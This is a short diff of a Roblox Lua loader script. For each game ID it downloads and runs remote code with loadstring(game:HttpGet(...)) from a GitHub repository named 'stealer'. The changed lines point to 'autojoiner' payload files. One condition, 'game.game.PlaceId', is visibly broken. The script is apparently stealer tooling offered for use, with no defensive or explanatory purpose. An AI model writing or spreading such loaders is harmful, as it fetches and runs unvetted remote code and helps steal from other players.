@@ -3,7 +3,7 @@ if run then
 elseif game.PlaceId == 142823291 then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/temphor/stealer/refs/heads/main/auto-joiner/mm2-autojoiner"))()
 elseif game.PlaceId == 920587237 then
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/temphor/stealer/refs/heads/main/horizon-ame"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/temphor/stealer/refs/heads/main/ame-autojoiner"))()
 elseif game.game.PlaceId == 126884695634066 then
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/temphor/stealer/refs/heads/main/horizon-gag"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/temphor/stealer/refs/heads/main/gag-autojoiner"))()
 end
